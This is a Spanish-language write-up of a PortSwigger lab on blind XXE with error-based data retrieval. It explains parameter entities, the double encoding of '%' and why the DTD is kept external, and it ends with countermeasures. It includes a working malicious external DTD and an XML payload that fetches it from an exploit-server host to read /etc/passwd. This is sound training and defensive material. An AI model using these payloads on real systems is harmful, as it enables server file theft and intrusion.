# Writeup: Exploiting blind XXE to retrieve data via error messages (PortSwigger)

- **Lab**: Exploiting blind XXE to retrieve data via error messages
- **URL**: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages
- **Categoría**: XXE -> Blind, exfil error-based con DTD remoto + parameter entities
- **Dificultad**: Practitioner
- **Credenciales**: no requiere login

---

## 1. Objetivo

Mismo endpoint POST `/product/stock` con body XML que los anteriores, pero el server **no refleja input** en la respuesta. Los labs anteriores explotaban la reflexión del `productId` en mensajes "Invalid product ID: ...". Aquí esa reflexión no existe (blind). Lo que sí existe es la **reflexión de errores del parser XML** verbatim en la respuesta. Hay que construir un payload que provoque un error donde el path del archivo "no encontrado" sea, literalmente, el contenido de `/etc/passwd` concatenado.

Para llegar ahí: cargar un DTD externo (hospedado en el exploit server del propio lab) que defina una cadena de **parameter entities** anidadas. La cadena lee el archivo, lo concatena en un path inexistente, y dispara una `FileNotFoundException` cuyo mensaje termina conteniendo el archivo entero.

### Lo importante antes de tocar nada

- **Three trucos no obvios juntos**: parameter entities anidadas, double encoding del `%` con `&#x25;`, y uso de path inexistente como canal de salida vía error message. Cada uno por separado parece esotérico; juntos forman el patrón canónico de XXE error-based exfil.
- **Por qué DTD externo**: XML 1.0 prohíbe ciertos anidamientos de entidades en DTDs internos (inline en `<!DOCTYPE [ ... ]>`). Mover el DTD a un recurso externo levanta esa restricción.
- **Por qué exploit server del lab y no infra externa**: el firewall de PortSwigger bloquea egress arbitrario desde el lab. El exploit server provisto por el lab vive en un dominio whitelisted (`*.exploit-server.net`) accesible desde el server lab.
- **Por qué `&#x25;` y no `%` literal en la declaración anidada**: controla el momento de expansión. Si pones `%` directo, el parser intenta expandir esa referencia al **declarar** la entidad, lo cual rompe la cadena. `&#x25;` es la entidad numérica de `%`, se decodifica a `%` solo cuando el outer entity se **expande**.

---

## 2. Diferencia con los labs XXE anteriores

Cuarto lab de la serie XXE, mecánica completamente nueva.

| Lab | Canal de salida | Técnica nueva |
|---|---|---|
| `exploiting-xxe-to-retrieve-files` | Reflexión de input en error de "Invalid product ID" | DOCTYPE inline + general entity con `file://` |
| `exploiting-xxe-to-perform-ssrf` | Misma reflexión | Cambio de esquema a `http://` para SSRF |
| `xxe-with-out-of-band-interaction` (PENDING) | DNS/HTTP a Collaborator | Parameter entities + DTD remoto, blind con OOB |
| **Este lab** | **Error message del parser** (in-band) | DTD remoto + cadena de parameter entities + double encoding |

La idea genérica: cuando el server no refleja input pero sí escupe stack traces / errores verbosos, **el error es un canal de exfiltración**. Solo hay que construir un escenario donde el contenido del archivo termine dentro del mensaje de error.

---

## 3. Background necesario: parameter entities vs general entities

### General entities (lo que usaste antes)

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
...
<productId>&xxe;</productId>
```

- Declaradas con `<!ENTITY name ...>`.
- Referenciadas con `&name;`.
- Se expanden en el **document body** (dentro de elementos).

### Parameter entities (las que necesitas aquí)

```xml
<!ENTITY % param SYSTEM "file:///etc/passwd">
...
%param;
```

- Declaradas con `<!ENTITY % name ...>` (el `%` después de `<!ENTITY`).
- Referenciadas con `%name;` en lugar de `&name;`.
- **Solo funcionan dentro de DTDs**, no en el document body.
- Pueden anidarse: el valor de una parameter entity puede contener referencias a otras parameter entities, e incluso declaraciones de nuevas entidades.

### Por qué el lab requiere parameter entities, no generales

XML 1.0 tiene una restricción explícita: dentro de un **DTD interno** (en `<!DOCTYPE foo [ ... ]>`), una **general entity** no puede contener referencias a otras entidades en su definición. Eso impide:

```xml
<!DOCTYPE foo [
  <!ENTITY file SYSTEM "file:///etc/passwd">
  <!ENTITY chain SYSTEM "file:///nonexistent/&file;">  <!-- prohibido en DTD interno -->
]>
```

Parameter entities **sí pueden** anidarse así, pero **solo si la declaración vive en un DTD externo** (no en el inline `[ ... ]`). Por eso el ataque mueve la cadena al DTD remoto: la spec lo permite ahí pero no inline.

Esta es la lección más reusable del lab: **si necesitas encadenar entidades en XXE, mueves la cadena a un DTD externo**.

---

## 4. Diseño del ataque

### 4.1 DTD malicioso (hospedado en `/exploit` del exploit server)

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### 4.2 XML payload (enviado al lab)

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT.exploit-server.net/exploit"> %xxe;]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

### 4.3 Cómo se desenrolla la cadena (paso por paso)

**Paso 1**: el lab parsea el XML enviado. Ve la declaración `<!ENTITY % xxe SYSTEM "https://...">`. Solo declara la entidad, **aún no resuelve la URL**.

**Paso 2**: ve `%xxe;` inmediatamente después. Aquí sí resuelve: hace HTTP GET al exploit server, descarga el DTD malicioso, y **interpreta su contenido como si estuviera escrito ahí inline**.

**Paso 3** (dentro del DTD remoto): primera línea, `<!ENTITY % file SYSTEM "file:///etc/passwd">`. Declara la entidad `file`. Aún no la resuelve.

**Paso 4**: segunda línea:
```xml
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
```
Declara la entidad `eval` cuyo **valor literal** es la cadena:
```
<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>
```
(porque `&#x25;` se decodifica a `%` durante la expansión, no durante la declaración.)

Lo importante de este paso: `eval` contiene **una declaración de entidad como string**. Ese string solo se interpreta como código XML cuando `eval` se expanda, no antes.

**Paso 5**: tercera línea: `%eval;`. Esto expande `eval`. El valor (la declaración como string) se "ejecuta" como si estuviera escrito ahí. El parser ahora ve y procesa:
```xml
<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>
```
Pero **al construir el SYSTEM URL**, expande `%file;`. Eso resuelve `file:///etc/passwd` y obtiene el contenido literal del archivo. La nueva entidad `error` queda declarada con SYSTEM apuntando a:
```
file:///nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
... (todo /etc/passwd)
```

**Paso 6**: cuarta línea: `%error;`. El parser intenta resolver esa SYSTEM URL.

**Paso 7**: el path no existe (es `/nonexistent/<contenido del archivo>`, evidentemente inválido). El parser lanza:
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
... (continúa con el resto de /etc/passwd)
```

**Paso 8**: el lab refleja ese error verbatim en la respuesta HTTP. Lees `/etc/passwd` ahí. Lab Solved.

---

## 5. Por qué funciona

### 5.1 Los parsers XML serializan errores con el path completo

Cuando un parser XML (Apache Xerces en Java, libxml2 en C, etc.) falla al resolver una `SYSTEM` URL, el mensaje de error incluye el path/URL que intentó resolver. Esto es comportamiento "razonable" para debugging: el dev quiere saber **qué archivo no se encontró**.

El bug surge cuando ese mensaje:
1. Se devuelve al cliente (en lugar de loguearse server-side y devolver un error genérico).
2. Contiene un valor controlable por el atacante (en este caso, expandido vía parameter entity chain).

Combinación: el path es atacante-controlado y se refleja en la respuesta. Ese es el canal.

### 5.2 La double encoding `&#x25;` aprovecha el orden de expansión XML

XML define un orden estricto de cuándo se expanden referencias:

- Dentro del **valor** de una entity declaration, **otras entity references SÍ se expanden** durante la declaración.
- **Character entity references** (`&#x25;` y similares) **también se decodifican** durante la declaración.

Si pones `%` literal en el valor de `eval`:
```xml
<!ENTITY % eval "<!ENTITY % error SYSTEM '...'>">
```
El parser intenta expandir `%error;` como referencia a parameter entity ya **al declarar `eval`**, lo cual falla porque `error` no existe aún. La cadena se rompe.

Si encodificas `%` como `&#x25;`:
```xml
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '...'>">
```
El parser decodifica `&#x25;` a `%` durante la declaración, así que el valor de `eval` queda con `%` literal. **Pero ese `%` no se interpreta como referencia** porque ya está en el valor, no en posición sintáctica para referencia. Solo cuando `%eval;` se expande más tarde, el contenido se reinyecta y el `%` aparece en posición sintáctica de declaración → entonces sí se procesa como declaración.

Es una técnica genérica para **diferir la expansión de referencias**. Aparece también en attacks contra otros parsers (XXE billion laughs, payloads recursivos).

### 5.3 El truco de "path inexistente como canal"

Inserción de datos en errors es una técnica de canal lateral común:
- **SQL error-based**: `WHERE id = (SELECT 1/0 FROM users WHERE substring(password,1,1)='a')` → errores de división por cero leakean info por timing/presencia.
- **XSLT error-based**: similar, errores de formato leakean valores de variables.
- **XPath error-based**: idéntico patrón.

El denominador común: **encontrar un construct que falla de manera específica cuando el dato target tiene cierta propiedad, y reflejar ese fallo al cliente**. En XXE, "construct que falla" = SYSTEM URL invalida. "Reflejo al cliente" = stack trace en el response.

---

## 6. Resolución

1. **Verificar exploit server**: en la barra del lab, click "Access the exploit server".
2. En el exploit server, body:
   ```xml
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
   %eval;
   %error;
   ```
   URL/File: `/exploit`. Click **Store**.
3. Anota la URL completa del exploit (ej. `https://exploit-XXX.exploit-server.net/exploit`).
4. En Burp Repeater, en la petición POST `/product/stock`, reemplazar el body por:
   ```xml
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-XXX.exploit-server.net/exploit"> %xxe;]>
   <stockCheck>
     <productId>1</productId>
     <storeId>1</storeId>
   </stockCheck>
   ```
   Mantener `Content-Type: application/xml`.
5. Send. Respuesta: HTTP 400 con body iniciando `"XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash..."` seguido del resto de `/etc/passwd`.
6. Lab Solved.

Si tras enviar:

- **Error genérico tipo "Internal server error" sin contenido**: error verbosity reducida server-side. No debería pasar en este lab.
- **`&#x25;` quedó como `%` literal**: tu editor lo decodificó. Mantenerlo exacto.
- **DTD no se carga (parser ignora silenciosamente)**: la URL del exploit server está mal, o el body del exploit quedó vacío, o el server lo envuelve en HTML. Verificar con `curl https://exploit-XXX.exploit-server.net/exploit` que el body que devuelve es exactamente el DTD.
- **Cadena se rompe en algún paso intermedio**: pegar el DTD exactamente como en el writeup, sin reformatear. El parser es muy estricto con el orden de declaraciones y los caracteres encodificados.

---

## 7. Resumen de la cadena

```mermaid
flowchart TB
    A[1. Atacante hospeda DTD malicioso en exploit server: 4 lineas con cadena de parameter entities]
    B[2. Atacante envia XML al lab con DOCTYPE que carga DTD remoto via %xxe;]
    C[3. Server lab parsea XML, hace HTTP GET al exploit server, recibe DTD]
    D[4. Parser interpreta DTD: declara %file y %eval, expande %eval]
    E[5. Expansion de %eval decodifica &#x25; a %, declarando %error con SYSTEM apuntando a /nonexistent/%file;]
    F[6. Al construir SYSTEM URL de %error, parser expande %file: lee /etc/passwd y concatena al path]
    G[7. Parser intenta resolver file:///nonexistent/<contenido /etc/passwd>, falla con FileNotFoundException]
    H[8. Server lab refleja stack trace verbatim en respuesta HTTP 400]
    I[9. Atacante lee /etc/passwd dentro del mensaje de error]

    A --> B --> C --> D --> E --> F --> G --> H --> I
```



Tres ideas para llevarse:

1. **Error messages son canal de exfiltración tan bueno como reflexión de input**, si conoces el formato. Identificar verbosidad de errores debería ser parte del recon de cualquier endpoint que parsee algo (XML, JSON, SQL, código). Si el error es verbose, hay vector.
2. **Parameter entities + DTD externo desbloquean ataques que el DTD interno prohíbe**. La spec XML restringe ciertos anidamientos en DTDs inline pero los permite en externos; mover la cadena al exploit server elude la restricción. Reusable en cualquier XXE blind donde necesites encadenar resoluciones.
3. **Double encoding controla el momento de expansión**. `&#x25;` para `%`, `&#x26;` para `&`, etc. Esta técnica aparece en muchas otras categorías (path traversal, SQLi, template injection) cuando necesitas diferir un carácter especial hasta una segunda ronda de procesamiento. Aprenderla aquí paga en muchos otros sitios.

---

## 8. Contramedidas

Defensas en orden de robustez:

1. **Deshabilitar resolución de external entities Y DTD externos** en el parser. Mismas configuraciones que mitigan los XXE anteriores, con énfasis en `external-parameter-entities` (aplica a parameter entities específicamente) además de `external-general-entities`. Java:
   ```java
   factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
   factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
   factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   ```
2. **Eliminar verbosidad de errores en respuestas HTTP**. Stack traces y mensajes de parser **nunca** deberían llegar al cliente en producción. Loguear server-side, devolver error genérico con un correlation ID. Esta defensa es ortogonal al fix del parser y mitiga vectores futuros que aún no anticipas.
3. **Egress filtering desde el server de aplicación**. Aunque el parser pidiera resolver una URL externa, si el server no puede hacer requests salientes a hosts arbitrarios, el DTD remoto no carga. Defense in depth: bloquear desde la red lo que el parser ya no debería hacer desde código.
4. **WAF con reglas anti-DOCTYPE en bodies XML**. Mitigación reactiva. Detectar `<!DOCTYPE` y `<!ENTITY` en bodies application/xml es razonable para apps que no necesitan DTDs definidos por usuarios. Bypass posibles vía encoding/nesting, no sustituye a las defensas de raíz.
5. **Migrar de XML a JSON** para endpoints nuevos. Ningún equivalente a entidades externas en JSON estándar. Reducción de superficie de ataque generacional.

---

## 9. Referencias

- PortSwigger Web Security Academy. (s.f.). *Lab: Exploiting blind XXE to retrieve data via error messages*. https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages
- PortSwigger Web Security Academy. (s.f.). *Blind XXE injection*. https://portswigger.net/web-security/xxe/blind
- PortSwigger Research. (2018). *XXE OOB exploitation at Java 1.7+*. https://portswigger.net/research/xxe-oob-exploitation-java-versions
- W3C. (2008). *Extensible Markup Language (XML) 1.0 (Fifth Edition) - Section 4.4 XML Processor Treatment of Entities and References*. https://www.w3.org/TR/xml/#sec-entexpand
- OWASP Foundation. (s.f.). *XML External Entity Prevention Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- Yunusov, T. & Osipov, A. (2013). *XML Out-Of-Band Data Retrieval*. Black Hat EU. https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf
- Writeups previos de la serie:
  - [`learning/portswigger/exploiting-xxe-to-retrieve-files/writeup.md`](../exploiting-xxe-to-retrieve-files/writeup.md)
  - [`learning/portswigger/exploiting-xxe-to-perform-ssrf/writeup.md`](../exploiting-xxe-to-perform-ssrf/writeup.md)
- Inventario interno: [`inventario/03-analisis-vulnerabilidades/web/analisis-xxe.md`](../../../inventario/03-analisis-vulnerabilidades/web/analisis-xxe.md)
